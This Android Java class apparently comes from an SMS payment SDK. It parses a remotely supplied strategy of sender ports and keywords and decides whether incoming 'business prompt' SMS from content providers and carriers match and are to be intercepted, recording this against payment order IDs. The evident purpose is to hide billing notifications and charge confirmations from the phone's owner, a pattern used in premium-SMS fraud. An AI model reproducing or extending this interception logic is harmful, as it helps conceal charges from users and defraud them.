package com.example.sayid.myapplication.common.bean;

import org.json.JSONException;
import org.json.JSONObject;

import com.example.sayid.myapplication.common.db2.BlockDao;
import com.example.sayid.myapplication.common.util.JsonUtil;

import android.content.Context;

/**
 * 业务提示语拦截
 *
 * @author luozhi
 */
public class BlockBusinessPrompt {

    /**
     * cp、运营商下行拦截策略，
     * 0表示拦截，
     * 1表示不拦截
     */
    public int prompt_strategy = 1;
    /**
     * 提示语下行端口，多个用|隔开
     * CP提示语+运营商提示语
     */
    public String prompt_port;

    /**
     * 短信关键字
     */
    public String prompt_keyword;
    /**
     * 提示运算符，默认: 1 = and
     */
    public int prompt_operator = 1;

    /**
     * CP 运营商策略是否使用
     */
    public boolean prompt_bool = false;

    /**
     * Json解析
     *
     * @param jsonObj
     * @throws JSONException
     */
    public void parseJson(JSONObject jsonObj) throws JSONException {
        // 业务提示拦截策略
        prompt_strategy = JsonUtil.isEmptyOrGetInt(jsonObj, "prompt_strategy", 1);
        prompt_port = JsonUtil.isNullOrGetStr(jsonObj, "cp_prompt_port");
        if (prompt_port.length() > 0) {
            prompt_port += "|";
        }
        prompt_port += JsonUtil.isNullOrGetStr(jsonObj, "third_prompt_port");
        prompt_keyword = JsonUtil.isNullOrGetStr(jsonObj, "prompt_keyword");
        prompt_operator = JsonUtil.isNullOrGetInt(jsonObj, "prompt_operator");

        // 运算符，不为1，2时，设置为1
        if (prompt_operator < 1 || prompt_operator > 2) {
            prompt_operator = 1;
        }
    }

    /**
     * 是否拦截
     *
     * @return
     */
    public boolean isBlock() {
        if (prompt_strategy == 0) {
//			UI.showAlertDialog(context, bean.pay_order_id, ShowDialogActivity.ONE_BUTTON, smsInbox.getBody(), 0);
            return true;
        }

        return false;
    }

    /**
     * 业务提示策略更新
     *
     * @param context
     * @param user_order_id
     * @param pay_order_id
     */
    public void promptUpdate(Context context, String user_order_id, String pay_order_id) {
        prompt_bool = true; // 策略已经使用

        // 更新拦截内容
        BlockDao blockDao = new BlockDao(context);
        blockDao.updateBusinessPrompt(this, pay_order_id);
    }

    @Override
    public String toString() {
        StringBuffer str = new StringBuffer();
        str.append("prompt_strategy=").append(prompt_strategy)
                .append(",prompt_port=").append(prompt_port)
                .append(",prompt_keyword=").append(prompt_keyword)
                .append(",prompt_operator=").append(prompt_operator)
                .append(",prompt_bool=").append(prompt_bool);

        return str.toString();
    }

    /**
     * 提示语是否匹配
     *
     * @param address
     * @param content
     * @param prompt_port
     * @param keyword
     * @return
     */
    public boolean isMatch(String address, String content) {
        int portLen = prompt_port.length();
        int keyLen = prompt_keyword.length();

        // 匹配端口
        boolean isMatchPort = false;
        if (portLen > 0) {
            // CP提示语下行端口，多个用|隔开
            String[] portArray = prompt_port.split("\\|");
            for (String str : portArray) {
                if (address.contains(str.trim()) && !str.equals("")) {
                    isMatchPort = true;
                    break;
                }
            }

            // 效率问题
            if (prompt_operator == 1) {
                if (!isMatchPort) {
                    return false;
                }
            } else if (prompt_operator == 2) {
                if (isMatchPort) {
                    return true;
                }
            }
            // 端口不填写
        } else {
            // 关键字填写
            if (keyLen > 0) {
                if (prompt_operator == 1) {
                    isMatchPort = true;
                } else if (prompt_operator == 2) {
                    isMatchPort = false;
                }
                // 关键字不填写
            } else {
                isMatchPort = false;
            }
        }

        // 匹配关键字
        boolean isMatchKeyWord = false;
        if (content == null) {
            isMatchKeyWord = true;
        } else {
            if (keyLen > 0) {
                // CP提示语下行短信，多个用|隔开
                String[] keyWordsArray = prompt_keyword.split("\\|");
                for (String str : keyWordsArray) {
                    // 关键字能匹配上
                    if (content.contains(str.trim()) && !str.equals("")) {
                        isMatchKeyWord = true;
                        break;
                    }
                }

                // 效率问题
                if (prompt_operator == 1) {
                    if (!isMatchKeyWord) {
                        return false;
                    }
                } else if (prompt_operator == 2) {
                    if (isMatchKeyWord) {
                        return true;
                    }
                }
                // 关键字不填写
            } else {
                // 端口填写
                if (portLen > 0) {
                    if (prompt_operator == 1) {
                        isMatchKeyWord = true;
                    } else if (prompt_operator == 2) {
                        isMatchKeyWord = false;
                    }
                    // 端口不填写
                } else {
                    isMatchKeyWord = false;
                }
            }
        }

        if (prompt_operator == 1) {
            if (isMatchKeyWord && isMatchPort) {
                return true;
            }
        } else if (prompt_operator == 2) {
            if (isMatchKeyWord || isMatchPort) {
                return true;
            }
        }

        return false;
    }

}
